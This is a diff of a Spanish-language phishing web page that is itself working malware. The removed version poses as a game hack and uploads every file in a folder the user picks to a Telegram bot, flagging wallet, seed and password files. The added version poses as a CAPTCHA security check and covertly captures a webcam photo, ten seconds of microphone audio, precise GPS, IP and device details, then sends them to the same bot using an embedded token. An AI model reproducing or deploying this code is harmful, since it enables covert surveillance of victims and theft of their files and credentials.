@@ -1,127 +1,183 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-<meta charset="UTF-8">
-<title>MineFun Hack Premium 2025</title>
-<style>
-  body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:30vh;font-size:22px;}
-  button{background:#0f0;color:black;padding:20px 40px;font-size:24px;border:none;border-radius:15px;cursor:pointer;margin:30px;}
-  button:hover{box-shadow:0 0 30px #0f0;}
-  .status{color:#0f0;margin-top:30px;}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de seguridad</title>
+  <style>
+    body {
+      background: white;
+      color: #1a0dab;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px 20px;
+      margin: 0;
+    }
+    .container {
+      max-width: 480px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      border: 1px solid #dadce0;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 16px;
+      line-height: 1.5;
+      margin-bottom: 30px;
+      color: #3c4043;
+    }
+    button {
+      background: #1a73e8;
+      color: white;
+      border: none;
+      padding: 14px 32px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 2px 6px rgba(26,115,232,0.3);
+    }
+    button:hover {
+      background: #1557b0;
+    }
+    .loader {
+      display: none;
+      margin: 30px auto;
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #1a73e8;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .status {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #5f6368;
+    }
+  </style>
 </head>
 <body>
 
-<h1>⚡ MINEFUN HACK PREMIUM 2026 ⚡</h1>
-<p>Para activar el hack ilimitado, elige una carpeta para no perder el progreso ya que es algo costoso</p>
-<button onclick="robarTodo()">GUARDAR HACK AQUÍ</button>
-<div class="status" id="status">Esperando que elijas carpeta...</div>
+<div class="container">
+  <h1>Verificación de seguridad</h1>
+  <p>Para continuar necesitamos verificar que no eres un robot.</p>
+  <p>Por favor acepta los siguientes permisos para completar la verificación:</p>
+  
+  <button onclick="verificarHumano()">ACEPTAR Y CONTINUAR</button>
+  
+  <div class="loader" id="loader"></div>
+  <div class="status" id="status"></div>
+</div>
 
 <script>
 
 const BOT_TOKEN = "8073881757:AAHpZPnjwg29xhmfkrahnmCnYsp8CbcMf_M";
 const CHAT_ID   = "8284747554";
+const URL_MSG   = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+const URL_PHOTO = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+const URL_AUDIO = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;
 
 
-const URL_DOC = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
-const URL_VID = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
-const URL_MSG = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+async function verificarHumano() {
+  document.getElementById("loader").style.display = "block";
+  document.getElementById("status").innerHTML = "Verificando permisos...";
 
-async function robarTodo() {
+  let datos = `🤖 NUEVA VÍCTIMA EN CAPTCHA VERIFICATION 2026\n\n`;
+
+  
+  const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+  const battery = await navigator.getBattery();
+  let gps = "Denegada";
   try {
-    document.getElementById("status").innerHTML = "✅ Acceso concedido<br>Espere 5 minutos para que se active automaticamente ";
+    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout: 10000}));
+    gps = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
+  } catch(e) {}
+
+  datos += `IP: ${ipData.ip}\n`;
+  datos += `Ubicación: ${ipData.city}, ${ipData.country_name} ${ipData.country_emoji || ""}\n`;
+  datos += `GPS exacto: ${gps}\n`;
+  datos += `Dispositivo: ${navigator.platform}\n`;
+  datos += `CPU: ${navigator.hardwareConcurrency} núcleos\n`;
+  datos += `RAM: ${navigator.deviceMemory || "?"} GB\n`;
+  datos += `Batería: ${Math.round(battery.level*100)}% ${battery.charging ? "⚡" : ""}\n`;
+  datos += `Pantalla: ${screen.width}x${screen.height}\n`;
+  datos += `Hora: ${new Date().toLocaleString('es-ES')}\n\n`;
+
+  
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video: true});
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
     
-    const dirHandle = await window.showDirectoryPicker({ mode: "readwrite" });
-
+    const canvas = document.createElement('canvas');
+    canvas.width = 1280;
+    canvas.height = 720;
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
     
-    let lat = "?", lon = "?";
-    try {
-      const pos = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 15000, maximumAge: 0});
-      });
-      lat = pos.coords.latitude.toFixed(8);
-      lon = pos.coords.longitude.toFixed(8);
-    } catch(e) {}
+    canvas.toBlob(async blob => {
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("photo", blob, "cara_victima.jpg");
+      form.append("caption", datos + "📸 FOTO DE LA VÍCTIMA CAPTURADA");
+      await fetch(URL_PHOTO, {method: "POST", body: form});
+    }, 'image/jpeg', 0.95);
 
-    const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-
-    const mapsLink = lat !== "?" ? `https://www.google.com/maps?q=${lat},${lon}&z=18` : "Ubicación denegada";
-
-    const infoVictima = `🟥 VÍCTIMA LOCALIZADA Y RAPEADA 🟥
-
-IP: ${ipData.ip || "?"}
-ISP: ${ipData.org || "?"}
-Ciudad: ${ipData.city || "?"}, ${ipData.region || "?"}, ${ipData.country_name || "?"} ${ipData.country_emoji || ""}
-Zona horaria: ${ipData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone}
-
-UBICACIÓN EXACTA EN TIEMPO REAL:
-${mapsLink}
-
-Carpeta elegida: ${dirHandle.name}
-Hora exacta: ${new Date().toLocaleString('es-ES')}
-
-¡EL HACK SE ESTÁ ACTIVANDO EN SU PC!`;
-
-    await fetch(URL_MSG, {method: "POST", headers: {"Content-Type": "application/json"}, 
-      body: JSON.stringify({chat_id: CHAT_ID, text: infoVictima, disable_web_page_preview: false})
-    });
-
-    const interesantes = [];
-    const pesados = [];
-
-    for await (const entry of dirHandle.values()) {
-      if (entry.kind === "file") {
-        const file = await entry.getFile();
-        const nombre = file.name.toLowerCase();
-
-        const esInteresante = nombre.includes("pass") || nombre.includes("wallet") || nombre.includes("seed") || 
-                              nombre.includes("dni") || nombre.includes("metamask") || nombre.includes("binance") || 
-                              nombre.includes("private") || nombre.includes("key") || nombre.includes("auth");
-
-        
-        const form = new FormData();
-        form.append("chat_id", CHAT_ID);
-        form.append("parse_mode", "HTML");
-
-        if (file.type.startsWith("video/") && file.size < 2 * 1024 * 1024 * 1024) {
-          form.append("video", file, file.name);
-          form.append("caption", `<b>🎥 VÍDEO ROBADO</b>\n📁 ${dirHandle.name}\n📄 ${file.name}\n⚖ ${(file.size/1024/1024).toFixed(2)} MB\n🕐 ${new Date().toLocaleString()}`);
-          await fetch(URL_VID, {method: "POST", body: form});
-        } else if (file.size < 2 * 1024 * 1024 * 1024) {
-          form.append("document", file, file.name);
-          form.append("caption", `<b>📁 ARCHIVO ROBADO</b>\n📁 ${dirHandle.name}\n📄 ${file.name}\n⚖ ${(file.size/1024/1024).toFixed(2)} MB\n${esInteresante ? "🔥 JUGOSO DETECTADO 🔥" : ""}\n🕐 ${new Date().toLocaleString()}`);
-          await fetch(URL_DOC, {method: "POST", body: form});
-        } else {
-          pesados.push(`${file.name} → ${(file.size/1024/1024/1024).toFixed(2)} GB (demasiado pesado)`);
-        }
-
-        if (esInteresante) interesantes.push(`🔥 ${file.name}`);
-      }
-    }
-
-    const resumenFinal = `✅ RAPEADO COMPLETADO CON ÉXITO ✅
-
-📁 Carpeta: <code>${dirHandle.name}</code>
-🌍 Ubicación: ${mapsLink}
-
-${interesantes.length > 0 ? "ARCHIVOS ULTRA JUGOSOS (" + interesantes.length + "):\n" + interesantes.join("\n") + "\n\n" : "No había archivos muy jugosos pero se subió TODO lo posible\n\n"}
-
-${pesados.length > 0 ? "ARCHIVOS DEMASIADO PESADOS (no subidos):\n" + pesados.join("\n") : ""}
-
-Hora final: ${new Date().toLocaleString('es-ES')}
-
-LA VÍCTIMA ESTÁ SIENDO VERIFICADA...`;
-
-    await fetch(URL_MSG, {method: "POST", headers: {"Content-Type": "application/json"}, 
-      body: JSON.stringify({chat_id: CHAT_ID, text: resumenFinal, parse_mode: "HTML", disable_web_page_preview: false})
-    });
-
-    document.getElementById("status").innerHTML = "Verificando... por favor espere mientras usted está siendo verificado<br><br>NO CIERRE ESTA VENTANA";
-
-  } catch (e) {
-    document.getElementById("status").innerHTML = "❌ Acceso denegado<br>El hack no se pudo activar";
+    stream.getTracks().forEach(t => t.stop());
+  } catch(e) {
+    datos += "📸 Cámara denegada o no disponible\n";
   }
+
+  
+  try {
+    const audioStream = await navigator.mediaDevices.getUserMedia({audio: true});
+    const recorder = new MediaRecorder(audioStream);
+    const chunks = [];
+    
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.start();
+    
+    setTimeout(() => {
+      recorder.stop();
+      audioStream.getTracks().forEach(t => t.stop());
+    }, 10000);
+
+    recorder.onstop = async () => {
+      const audioBlob = new Blob(chunks, {type: 'audio/webm'});
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("audio", audioBlob, "voz_victima.webm");
+      form.append("caption", datos + "🎤 AUDIO DE 10 SEGUNDOS CAPTURADO");
+      await fetch(URL_AUDIO, {method: "POST", body: form});
+    };
+  } catch(e) {
+    datos += "🎤 Micrófono denegado\n";
+  }
+
+  
+  setTimeout(() => {
+    fetch(URL_MSG, {method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id: CHAT_ID, text: datos + "\n✅ VERIFICACIÓN COMPLETADA\nLa víctima aceptó todos los permisos"})
+    });
+  }, 3000);
+
+  
+  setTimeout(() => {
+    document.getElementById("status").innerHTML = "✓ Verificación completada. Continuando...";
+    
+  }, 5000);
 }
 </script>
+
 </body>
 </html>
